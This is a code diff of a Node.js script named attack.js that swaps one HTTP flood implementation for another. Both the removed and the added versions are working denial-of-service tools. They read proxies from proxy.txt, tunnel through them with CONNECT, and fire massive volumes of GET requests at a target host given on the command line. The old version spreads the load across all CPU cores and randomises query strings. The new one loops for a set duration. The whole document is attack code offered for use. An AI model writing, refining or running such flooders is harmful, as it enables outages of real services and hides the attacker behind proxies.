@@ -1,77 +1,68 @@
 const fs = require('fs');
-const net = require('net');
-const tls = require('tls');
-const { randomBytes } = require('crypto');
-const { cpus } = require('os');
-const cluster = require('cluster');
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const { argv } = process;
 
-// Target via CLI
-const target = process.argv[2];
-if (!target) {
-  console.log('使い方: node attack.js <ターゲットホスト>');
-  process.exit(1);
+if (argv.length < 4) {
+    console.log("Usage: node attack.js <target> <time>");
+    process.exit(1);
 }
 
-const TARGET_HOST = target.replace(/^https?:\/\//, '').split('/')[0]; // remove https:// and path
-const TARGET_PORT = 443;
-const TARGET_PATH = '/?id='; // hardcoded path + param
-const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
-const CORES = cpus().length;
-const SWITCH_INTERVAL = 5000;
+const target = argv[2];
+const duration = parseInt(argv[3]) * 1000;
 
-if (cluster.isMaster) {
-  for (let i = 0; i < CORES; i++) cluster.fork();
-} else {
-  let total = 0;
-  let proxyIndex = 0;
-  let proxy = PROXIES[proxyIndex];
+const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim().length);
+let count = 0;
 
-  setInterval(() => {
-    proxyIndex = (proxyIndex + 1) % PROXIES.length;
-    proxy = PROXIES[proxyIndex];
-  }, SWITCH_INTERVAL);
+function randProxy() {
+    const [ip, port] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
+    return { ip, port };
+}
 
-  setInterval(() => {
-    process.stdout.write(`\r合計リクエスト送信数: ${total.toLocaleString()} `);
-  }, 2000);
+function sendRawRequest() {
+    const { ip, port } = randProxy();
+    const parsed = url.parse(target);
 
-  function fire() {
-    const [proxyHost, proxyPort] = proxy.split(':');
+    const options = {
+        host: ip,
+        port: parseInt(port),
+        method: 'CONNECT',
+        path: `${parsed.hostname}:443`
+    };
 
-    try {
-      const socket = net.connect(proxyPort, proxyHost, () => {
-        socket.write(`CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\nHost: ${TARGET_HOST}\r\n\r\n`);
+    const req = http.request(options);
+    req.on('connect', (res, socket) => {
+        const reqOptions = {
+            host: parsed.hostname,
+            method: 'GET',
+            path: parsed.path || '/',
+            headers: {
+                Host: parsed.hostname,
+                'User-Agent': 'flooder',
+            },
+            createConnection: () => socket
+        };
 
-        const tlsSocket = tls.connect({
-          socket,
-          servername: TARGET_HOST,
-          rejectUnauthorized: false
-        }, () => {
-          const req =
-            `GET ${TARGET_PATH + randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
-            `Host: ${TARGET_HOST}\r\n` +
-            `User-Agent: RawStorm/JP\r\n` +
-            `Accept: */*\r\n` +
-            `Connection: close\r\n\r\n`;
-          tlsSocket.write(req);
-          tlsSocket.end();
+        const request = https.request(reqOptions, () => {
+            // Don't wait, just dip
+            count++;
+            console.log(`(${count}) Sent to ${target}`);
         });
 
-        tlsSocket.on('error', () => {});
-      });
+        request.on('error', () => {});
+        request.end();
+    });
 
-      socket.on('error', () => {});
-      socket.setTimeout(1000, () => socket.destroy());
-
-      total++;
-    } catch {}
-  }
-
-  const flood = () => {
-    setInterval(() => {
-      for (let i = 0; i < 300; i++) fire(); // lowered from 1000 to 300 per tick
-    }, 1);
-  };
-
-  setImmediate(flood);
+    req.on('error', () => {});
+    req.end();
 }
+
+const end = Date.now() + duration;
+const flood = () => {
+    while (Date.now() < end) {
+        sendRawRequest();
+    }
+};
+
+flood();
